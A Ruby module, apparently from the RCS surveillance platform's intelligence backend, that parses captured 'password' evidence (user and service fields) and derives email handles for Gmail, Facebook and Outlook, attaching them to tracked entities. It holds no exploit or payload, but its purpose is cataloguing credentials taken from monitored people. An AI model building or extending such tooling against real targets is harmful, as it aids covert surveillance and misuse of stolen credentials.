require 'mail'
require 'rcs-common/trace'

module RCS
module Intelligence

module Passwords
  extend Tracer
  extend self

  def known_domains
    {
      /gmail|google/i => '@gmail.com',
      /facebook/i     => '@facebook.com',
      /outlook/i      => '@outlook.com'
    }
  end

  def valid_password_evidence?(evidence)
    data = evidence[:data]
    return false unless evidence.type == 'password'
    return false if data['user'].blank? or data['service'].blank?
    true
  end

  def add_handle(entity, password_evidence)
    data = password_evidence[:data]

    trace :debug, "Parsing handle data: #{data.inspect}"

    return unless valid_password_evidence?(password_evidence)

    handle = email_address data['user'], data['service']

    return unless handle

    entity.create_or_update_handle :mail, handle, data['user']
  rescue Exception => e
    trace :error, "Cannot add handle: #{e.message}"
    trace :fatal, e.backtrace.join("\n")
  end

  def email_address user, service
    handle = user.downcase

    return handle if valid_email_addr?(handle)

    match = known_domains.find { |regexp, domain| service =~ regexp }
    "#{handle}#{match[1]}" if match
  end

  def valid_email_addr?(value)
    return false if value == ''
    parsed = Mail::Address.new(value)
    return parsed.address == value && parsed.local != parsed.address
  rescue Mail::Field::ParseError
    return false
  end
end

end
end
